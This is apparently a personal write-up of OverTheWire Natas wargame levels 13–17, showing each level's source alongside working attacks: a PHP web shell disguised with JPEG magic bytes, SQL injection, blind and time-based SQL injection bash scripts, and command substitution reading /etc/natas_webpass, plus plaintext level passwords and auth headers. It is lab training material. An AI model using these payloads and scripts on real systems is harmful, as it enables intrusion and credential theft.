rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;http://natas.labs.overthewire.org/css/wechall.css\u0026quot; /\u0026gt; \u0026lt;script src=\u0026quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026quot;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026quot;http://natas.labs.overthewire.org/js/wechall.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026quot;level\u0026quot;: \u0026quot;natas13\u0026quot;, \u0026quot;pass\u0026quot;: \u0026quot;\u0026lt;censored\u0026gt;\u0026quot; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas13\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026quot;content\u0026quot;\u0026gt; For security reasons, we now only accept image files!\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;? function genRandomString() { $length = 10; $characters = \u0026quot;0123456789abcdefghijklmnopqrstuvwxyz\u0026quot;; $string = \u0026quot;\u0026quot;; for ($p = 0; $p \u0026lt; $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string; } function makeRandomPath($dir, $ext) { do { $path = $dir.\u0026quot;/\u0026quot;.genRandomString().\u0026quot;.\u0026quot;.$ext; } while(file_exists($path)); return $path; } function makeRandomPathFromFilename($dir, $fn) { $ext = pathinfo($fn, PATHINFO_EXTENSION); return makeRandomPath($dir, $ext); } if(array_key_exists(\u0026quot;filename\u0026quot;, $_POST)) { $target_path = makeRandomPathFromFilename(\u0026quot;upload\u0026quot;, $_POST[\u0026quot;filename\u0026quot;]); $err=$_FILES['uploadedfile']['error']; if($err){ if($err === 2){ echo \u0026quot;The uploaded file exceeds MAX_FILE_SIZE\u0026quot;; } else{ echo \u0026quot;Something went wrong :/\u0026quot;; } } else if(filesize($_FILES['uploadedfile']['tmp_name']) \u0026gt; 1000) { echo \u0026quot;File is too big\u0026quot;; } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { echo \u0026quot;File is not an image\u0026quot;; } else { if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { echo \u0026quot;The file \u0026lt;a href=\\\u0026quot;$target_path\\\u0026quot;\u0026gt;$target_path\u0026lt;/a\u0026gt; has been uploaded\u0026quot;; } else{ echo \u0026quot;There was an error uploading the file, please try again!\u0026quot;; } } } else { ?\u0026gt; \u0026lt;form enctype=\u0026quot;multipart/form-data\u0026quot; action=\u0026quot;index.php\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;MAX_FILE_SIZE\u0026quot; value=\u0026quot;1000\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;filename\u0026quot; value=\u0026quot;\u0026lt;? print genRandomString(); ?\u0026gt;.jpg\u0026quot; /\u0026gt; Choose a JPEG to upload (max 1KB):\u0026lt;br/\u0026gt; \u0026lt;input name=\u0026quot;uploadedfile\u0026quot; type=\u0026quot;file\u0026quot; /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Upload File\u0026quot; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;? } ?\u0026gt; \u0026lt;div id=\u0026quot;viewsource\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;index-source.html\u0026quot;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  exif_imagetype checks the first bytes of the \u0026lsquo;image\u0026rsquo; and verify its a image.\nThese first bytes are also called the \u0026lsquo;magic number\u0026rsquo; or \u0026lsquo;magic bytes\u0026rsquo;.\nIf we change the first bytes of our file to match a image file, lets say jpg, exif_imagetype will lets it pass. FF D8 FF DB is the JPEG magic number\nhttps://www.wikiwand.com/en/List_of_file_signatures\nI used hexdump for VSCode https://marketplace.visualstudio.com/items?itemName=slevesque.vscode-hexdump\nOffset: 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 00000000: FF D8 FF DB 3C 21 2D 2D 20 42 79 20 6A 75 73 74 .X.[\u0026lt;!--.By.just 00000010: 69 6E 2D 70 20 28 68 74 74 70 73 3A 2F 2F 72 61 in-p.(https://ra  Python could also be used to add the magic bytes.\nfh = open('p_shell.php', 'w') fh.write('\\xFF\\xD8\\xFF\\xE0' + '\u0026lt;?php if (empty($_POST[\\'cmd\\'])) {$cmd = \u0026quot;\u0026quot;;} elseif (!empty($_POST[\\'cmd\\'])) {$cmd = shell_exec($_POST[\\'cmd\\']);} ?\u0026gt;\u0026lt;form method=\u0026quot;POST\u0026quot;\u0026gt;\u0026lt;input type=\u0026quot;text\u0026quot; style=\u0026quot;width:100%;height:25px;\u0026quot; name=\u0026quot;cmd\u0026quot; id=\u0026quot;cmd\u0026quot; value=\u0026quot;\u0026lt;?php if (!empty($_POST[\\'cmd\\'])) {htmlspecialchars($_POST[\\'cmd\\'], ENT_QUOTES, \\'UTF-8\\');} ?\u0026gt;\u0026quot; required\u0026gt;\u0026lt;button type=\u0026quot;submit\u0026quot; class=\u0026quot;btn btn-primary\u0026quot;\u0026gt;Execute\u0026lt;/button\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;?php if (!$cmd \u0026amp;\u0026amp; $_SERVER[\\'REQUEST_METHOD\\'] != \\'POST\\'): ?\u0026gt;\u0026lt;small\u0026gt;Enter command.\u0026lt;/small\u0026gt; \u0026lt;?php elseif ($cmd): ?\u0026gt;\u0026lt;pre\u0026gt;\u0026lt;?= htmlspecialchars($cmd, ENT_QUOTES, \\'UTF-8\\') ?\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;?php elseif (!$cmd \u0026amp;\u0026amp; $_SERVER[\\'REQUEST_METHOD\\'] == \\'POST\\'): ?\u0026gt;\u0026lt;small\u0026gt;No results.\u0026lt;/small\u0026gt; \u0026lt;?php endif; ?\u0026gt;') fh.close()  Upload the file and cat the password file\nLg96M10TdfaPyVBkJdjymbllQ5L6qdl1\nNatas 14 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; type=\u0026quot;text/css\u0026quot; href=\u0026quot;http://natas.labs.overthewire.org/css/level.css\u0026quot;\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026quot; /\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;http://natas.labs.overthewire.org/css/wechall.css\u0026quot; /\u0026gt; \u0026lt;script src=\u0026quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026quot;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026quot;http://natas.labs.overthewire.org/js/wechall.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026quot;level\u0026quot;: \u0026quot;natas14\u0026quot;, \u0026quot;pass\u0026quot;: \u0026quot;\u0026lt;censored\u0026gt;\u0026quot; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas14\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026quot;content\u0026quot;\u0026gt; \u0026lt;? if(array_key_exists(\u0026quot;username\u0026quot;, $_REQUEST)) { $link = mysql_connect('localhost', 'natas14', '\u0026lt;censored\u0026gt;'); mysql_select_db('natas14', $link); $query = \u0026quot;SELECT * from users where username=\\\u0026quot;\u0026quot;.$_REQUEST[\u0026quot;username\u0026quot;].\u0026quot;\\\u0026quot; and password=\\\u0026quot;\u0026quot;.$_REQUEST[\u0026quot;password\u0026quot;].\u0026quot;\\\u0026quot;\u0026quot;; if(array_key_exists(\u0026quot;debug\u0026quot;, $_GET)) { echo \u0026quot;Executing query: $query\u0026lt;br\u0026gt;\u0026quot;; } if(mysql_num_rows(mysql_query($query, $link)) \u0026gt; 0) { echo \u0026quot;Successful login! The password for natas15 is \u0026lt;censored\u0026gt;\u0026lt;br\u0026gt;\u0026quot;; } else { echo \u0026quot;Access denied!\u0026lt;br\u0026gt;\u0026quot;; } mysql_close($link); } else { ?\u0026gt; \u0026lt;form action=\u0026quot;index.php\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt; Username: \u0026lt;input name=\u0026quot;username\u0026quot;\u0026gt;\u0026lt;br\u0026gt; Password: \u0026lt;input name=\u0026quot;password\u0026quot;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Login\u0026quot; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;? } ?\u0026gt; \u0026lt;div id=\u0026quot;viewsource\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;index-source.html\u0026quot;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  SELECT * from users where username=\u0026quot;username_input\u0026quot; and password=\u0026quot;password_input\u0026quot;  so if we input\nnatas14 pass\u0026quot; or \u0026quot;1\u0026quot;=\u0026quot;1  it will look like this.\nSELECT * from users where username=\u0026quot;natas14\u0026quot; or and password=\u0026quot;pass\u0026quot; or \u0026quot;1\u0026quot;=\u0026quot;1\u0026quot;  Since the or is always true ( 1 = 1) the password doesnt need to be correct.\nAwWj0w5cvxrZiONgZ9J5stNVkmxdk39J  Natas15 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; type=\u0026quot;text/css\u0026quot; href=\u0026quot;http://natas.labs.overthewire.org/css/level.css\u0026quot;\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026quot; /\u0026gt; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;http://natas.labs.overthewire.org/css/wechall.css\u0026quot; /\u0026gt; \u0026lt;script src=\u0026quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026quot;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026quot;http://natas.labs.overthewire.org/js/wechall.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026quot;level\u0026quot;: \u0026quot;natas15\u0026quot;, \u0026quot;pass\u0026quot;: \u0026quot;\u0026lt;censored\u0026gt;\u0026quot; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas15\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026quot;content\u0026quot;\u0026gt; \u0026lt;? /* CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL ); */ if(array_key_exists(\u0026quot;username\u0026quot;, $_REQUEST)) { $link = mysql_connect('localhost', 'natas15', '\u0026lt;censored\u0026gt;'); mysql_select_db('natas15', $link); $query = \u0026quot;SELECT * from users where username=\\\u0026quot;\u0026quot;.$_REQUEST[\u0026quot;username\u0026quot;].\u0026quot;\\\u0026quot;\u0026quot;; if(array_key_exists(\u0026quot;debug\u0026quot;, $_GET)) { echo \u0026quot;Executing query: $query\u0026lt;br\u0026gt;\u0026quot;; } $res = mysql_query($query, $link); if($res) { if(mysql_num_rows($res) \u0026gt; 0) { echo \u0026quot;This user exists.\u0026lt;br\u0026gt;\u0026quot;; } else { echo \u0026quot;This user doesn't exist.\u0026lt;br\u0026gt;\u0026quot;; } } else { echo \u0026quot;Error in query.\u0026lt;br\u0026gt;\u0026quot;; } mysql_close($link); } else { ?\u0026gt; \u0026lt;form action=\u0026quot;index.php\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt; Username: \u0026lt;input name=\u0026quot;username\u0026quot;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Check existence\u0026quot; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;? } ?\u0026gt; \u0026lt;div id=\u0026quot;viewsource\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;index-source.html\u0026quot;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  blind sql injection\nInput : natas16 Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; Result : true  Input : natas16\u0026quot; AND \u0026quot;1\u0026quot;=\u0026quot;1 Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; AND \u0026quot;1\u0026quot;=\u0026quot;1\u0026quot; Result : true  A good next thing to know whould be the password lenght. Lets first test the username lenght.\nTesting username lenght\nWe should get a \u0026lsquo;This user exists.\u0026rsquo; if the lenght of username is 7.\ninput : natas16\u0026quot; AND (SELECT LENGTH(username) FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1)=1# Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; AND (SELECT LENGTH(username) FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1)=1# Result : false  input : natas16\u0026quot; AND (SELECT LENGTH(username) FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1)=7# Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; AND (SELECT LENGTH(username) FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1)=7# Result : true  So now lets test the password lenght.\ninput : natas16\u0026quot; AND (SELECT LENGTH(password) FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1)=1# Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; AND (SELECT LENGTH(password) FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1)=1# Result : false  so far all the passwords had a lenght of 32, so lets that that.\ninput : natas16\u0026quot; AND (SELECT LENGTH(password) FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1)=32# Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; AND (SELECT LENGTH(password) FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1)=32# Result : true  now lets test the actual password\nfirst verify with the username\nInput : natas16\u0026quot; AND (SELECT username FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE \u0026quot;a%\u0026quot;# Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; AND (SELECT username FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE \u0026quot;a%\u0026quot;# Result : false  Input : natas16\u0026quot; AND (SELECT username FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE \u0026quot;n%\u0026quot;# Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; AND (SELECT username FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE \u0026quot;n%\u0026quot;# Result : true  So we know this works. Now lets try the password.\nInput : natas16\u0026quot; AND (SELECT password FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE \u0026quot;W%\u0026quot;# Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; AND (SELECT password FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE \u0026quot;W%\u0026quot;# Result : true  but if we try\nInput : natas16\u0026quot; AND (SELECT password FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE \u0026quot;w%\u0026quot;# Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; AND (SELECT password FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE \u0026quot;w%\u0026quot;# Result : true  this also works. This is because LIKE is case insensitive, we should use LIKE BINARY.\nInput : natas16\u0026quot; AND (SELECT username FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE BINARY \u0026quot;N%\u0026quot;# Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; AND (SELECT username FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE BINARY \u0026quot;N%\u0026quot;# Result : false  Input : natas16\u0026quot; AND (SELECT username FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE BINARY \u0026quot;n%\u0026quot;# Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; AND (SELECT username FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE BINARY \u0026quot;n%\u0026quot;# Result : true  Input : natas16\u0026quot; AND (SELECT password FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE BINARY \u0026quot;w%\u0026quot;# Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; AND (SELECT password FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE BINARY \u0026quot;w%\u0026quot;# Result : false  natas16\u0026quot; AND (SELECT password FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE BINARY \u0026quot;W%\u0026quot;# Query : SELECT * from users where username=\u0026quot;natas16\u0026quot; AND (SELECT password FROM users WHERE username=\u0026quot;natas16\u0026quot; LIMIT 1) LIKE BINARY \u0026quot;W%\u0026quot;# Result : true  Lets create a bash script to get the password\npasswordlenght=32 CurrentChar=0 password=\u0026quot;\u0026quot; while [ $CurrentChar -ne $passwordlenght ] do for letter in {{a..z},{A..Z},{0..9}}; do injection=\u0026quot;\\\u0026quot; AND (SELECT password FROM users WHERE username=\\\u0026quot;natas16\\\u0026quot; LIMIT 1) LIKE BINARY \\\u0026quot;$password$letter%\\\u0026quot;#\u0026quot; data=\u0026quot;username=natas16$injection\u0026quot; curl_output=$(curl -s 'http://natas15.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' -d \u0026quot;$data\u0026quot;) if echo $curl_output | grep -q \u0026quot;This user exists.\u0026quot;; then password=\u0026quot;${password}${letter}\u0026quot; CurrentChar=$(( $CurrentChar + 1 )) echo \u0026quot;[+] Password: $password\u0026quot; continue 2 fi done done  [+] Password: W [+] Password: Wa [+] Password: WaI [+] Password: WaIH [+] Password: WaIHE [+] Password: WaIHEa [+] Password: WaIHEac [+] Password: WaIHEacj [+] Password: WaIHEacj6 [+] Password: WaIHEacj63 [+] Password: WaIHEacj63w [+] Password: WaIHEacj63wn [+] Password: WaIHEacj63wnN [+] Password: WaIHEacj63wnNI [+] Password: WaIHEacj63wnNIB [+] Password: WaIHEacj63wnNIBR [+] Password: WaIHEacj63wnNIBRO [+] Password: WaIHEacj63wnNIBROH [+] Password: WaIHEacj63wnNIBROHe [+] Password: WaIHEacj63wnNIBROHeq [+] Password: WaIHEacj63wnNIBROHeqi [+] Password: WaIHEacj63wnNIBROHeqi3 [+] Password: WaIHEacj63wnNIBROHeqi3p [+] Password: WaIHEacj63wnNIBROHeqi3p9 [+] Password: WaIHEacj63wnNIBROHeqi3p9t [+] Password: WaIHEacj63wnNIBROHeqi3p9t0 [+] Password: WaIHEacj63wnNIBROHeqi3p9t0m [+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5 [+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5n [+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5nh [+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhm [+] Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh  WaIHEacj63wnNIBROHeqi3p9t0m5nhmh\nNatas16 Find words containing: \u0026lt;input name=needle\u0026gt;\u0026lt;input type=submit name=submit value=Search\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/form\u0026gt; Output: \u0026lt;pre\u0026gt; \u0026lt;? $key = \u0026quot;\u0026quot;; if(array_key_exists(\u0026quot;needle\u0026quot;, $_REQUEST)) { $key = $_REQUEST[\u0026quot;needle\u0026quot;]; } if($key != \u0026quot;\u0026quot;) { if(preg_match('/[;|\u0026amp;`\\'\u0026quot;]/',$key)) { print \u0026quot;Input contains an illegal character!\u0026quot;; } else { passthru(\u0026quot;grep -i \\\u0026quot;$key\\\u0026quot; dictionary.txt\u0026quot;); } } ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;div id=\u0026quot;viewsource\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;index-source.html\u0026quot;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  $(grep -E ^8.* /etc/natas_webpass/natas17)hackers\npasswordlenght=32 CurrentChar=0 password=\u0026quot;\u0026quot; while [ $CurrentChar -ne $passwordlenght ] do for letter in {{a..z},{A..Z},{0..9}}; do curl_output=$(curl -s \u0026quot;http://natas16.natas.labs.overthewire.org/?needle=\u0026quot;%\u0026quot;24\u0026quot;%\u0026quot;28grep+-E+\u0026quot;%\u0026quot;5E${password}${letter}.*+\u0026quot;%\u0026quot;2Fetc\u0026quot;%\u0026quot;2Fnatas_webpass\u0026quot;%\u0026quot;2Fnatas17\u0026quot;%\u0026quot;29hackers\u0026amp;submit=Search\u0026quot; -H \u0026quot;Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==\u0026quot;) if echo $curl_output | grep -q -v \u0026quot;hackers\u0026quot;; then password=\u0026quot;${password}${letter}\u0026quot; CurrentChar=$(( $CurrentChar + 1 )) echo \u0026quot;[+] Password: $password\u0026quot; continue 2 fi done done  [+] Password: 8 [+] Password: 8P [+] Password: 8Ps [+] Password: 8Ps3 [+] Password: 8Ps3H [+] Password: 8Ps3H0 [+] Password: 8Ps3H0G [+] Password: 8Ps3H0GW [+] Password: 8Ps3H0GWb [+] Password: 8Ps3H0GWbn [+] Password: 8Ps3H0GWbn5 [+] Password: 8Ps3H0GWbn5r [+] Password: 8Ps3H0GWbn5rd [+] Password: 8Ps3H0GWbn5rd9 [+] Password: 8Ps3H0GWbn5rd9S [+] Password: 8Ps3H0GWbn5rd9S7 [+] Password: 8Ps3H0GWbn5rd9S7G [+] Password: 8Ps3H0GWbn5rd9S7Gm [+] Password: 8Ps3H0GWbn5rd9S7GmA [+] Password: 8Ps3H0GWbn5rd9S7GmAd [+] Password: 8Ps3H0GWbn5rd9S7GmAdg [+] Password: 8Ps3H0GWbn5rd9S7GmAdgQ [+] Password: 8Ps3H0GWbn5rd9S7GmAdgQN [+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNd [+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdk [+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkh [+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhP [+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk [+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq [+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9 [+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c [+] Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw\nNatas17 \u0026lt;? /* CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL ); */ if(array_key_exists(\u0026quot;username\u0026quot;, $_REQUEST)) { $link = mysql_connect('localhost', 'natas17', '\u0026lt;censored\u0026gt;'); mysql_select_db('natas17', $link); $query = \u0026quot;SELECT * from users where username=\\\u0026quot;\u0026quot;.$_REQUEST[\u0026quot;username\u0026quot;].\u0026quot;\\\u0026quot;\u0026quot;; if(array_key_exists(\u0026quot;debug\u0026quot;, $_GET)) { echo \u0026quot;Executing query: $query\u0026lt;br\u0026gt;\u0026quot;; } $res = mysql_query($query, $link); if($res) { if(mysql_num_rows($res) \u0026gt; 0) { //echo \u0026quot;This user exists.\u0026lt;br\u0026gt;\u0026quot;; } else { //echo \u0026quot;This user doesn't exist.\u0026lt;br\u0026gt;\u0026quot;; } } else { //echo \u0026quot;Error in query.\u0026lt;br\u0026gt;\u0026quot;; } mysql_close($link); } else { ?\u0026gt; \u0026lt;form action=\u0026quot;index.php\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt; Username: \u0026lt;input name=\u0026quot;username\u0026quot;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Check existence\u0026quot; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;? } ?\u0026gt; \u0026lt;div id=\u0026quot;viewsource\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;index-source.html\u0026quot;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  natas18\u0026quot; and sleep(3) #  curl -o /dev/null -s -X POST \u0026quot;http://natas17.natas.labs.overthewire.org/index.php\u0026quot; -H \u0026quot;Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==\u0026quot; --data \u0026quot;username=natas18\u0026quot;%\u0026quot;22+and++sleep\u0026quot;%\u0026quot;283\u0026quot;%\u0026quot;29+\u0026quot;%\u0026quot;23\u0026quot; -w %{time_total}  natas18\u0026quot; AND IF(1=1, SLEEP(3), 0)#  natas18\u0026quot; AND IF((SELECT MID(username, 1, 1) FROM users WHERE username=\u0026quot;natas18\u0026quot;)='n', SLEEP(3), 0) #  passwordlenght=32 CurrentChar=0 password=\u0026quot;\u0026quot; sleeptime=10 MIDCounter=1 while [ $CurrentChar -ne $passwordlenght ] do for letter in {{a..z},{A..Z},{0..9}}; do injection=\u0026quot;\\\u0026quot; AND IF((SELECT MID(password, 1, $MIDCounter) FROM users WHERE username=\\\u0026quot;natas18\\\u0026quot;)='$password$letter', SLEEP($sleeptime), 0) #\u0026quot; #echo $injection data=\u0026quot;username=natas18$injection\u0026quot; curl_output=$(curl -o /dev/null -s 'http://natas17.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==' -d \u0026quot;$data\u0026quot; -w %{time_total}) time=$(echo $curl_output | cut -d \u0026quot;.\u0026quot; -f 1) if [ $time -ge 10 ]; then password=\u0026quot;${password}${letter}\u0026quot; CurrentChar=$(( $CurrentChar + 1 )) MIDCounter=$(( $MIDCounter + 1 )) echo \u0026quot;[+] Password: $password\u0026quot; continue 2 fi done done  works, but case insensative.\n[+] Password: x [+] Password: xv [+] Password: xvk [+] Password: xvki [+] Password: xvkiq [+] Password: xvkiqd [+] Password: xvkiqdj [+] Password: xvkiqdjy  passwordlenght=32 CurrentChar=0 password=\u0026quot;\u0026quot; sleeptime=10 while [ $CurrentChar -ne $passwordlenght ] do for letter in {{a..z},{A..Z},{0..9}}; do injection=\u0026quot;\\\u0026quot; AND IF(password LIKE BINARY \\\u0026quot;$password$letter%\\\u0026quot;, SLEEP($sleeptime), 0) #\u0026quot; data=\u0026quot;username=natas18$injection\u0026quot; curl_output=$(curl -o /dev/null -s 'http://natas17.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==' -d \u0026quot;$data\u0026quot; -w %{time_total}) time=$(echo $curl_output | cut -d \u0026quot;.\u0026quot; -f 1) if [ $time -ge 10 ]; then password=\u0026quot;${password}${letter}\u0026quot; CurrentChar=$(( $CurrentChar + 1 )) MIDCounter=$(( $MIDCounter + 1 )) echo \u0026quot;[+] Password: $password\u0026quot; continue 2 fi done done  +] Password: x [+] Password: xv [+] Password: xvK [+] Password: xvKI [+] Password: xvKIq [+] Password: xvKIqD [+] Password: xvKIqDj [+] Password: xvKIqDjy [+] Password: xvKIqDjy4 [+] Password: xvKIqDjy4O [+] Password: xvKIqDjy4OP [+] Password: xvKIqDjy4OPv [+] Password: xvKIqDjy4OPv7 [+] Password: xvKIqDjy4OPv7w [+] Password: xvKIqDjy4OPv7wC [+] Password: xvKIqDjy4OPv7wCR [+] Password: xvKIqDjy4OPv7wCRg [+] Password: xvKIqDjy4OPv7wCRgD [+] Password: xvKIqDjy4OPv7wCRgDl [+] Password: xvKIqDjy4OPv7wCRgDlm [+] Password: xvKIqDjy4OPv7wCRgDlmj [+] Password: xvKIqDjy4OPv7wCRgDlmj0 [+] Password: 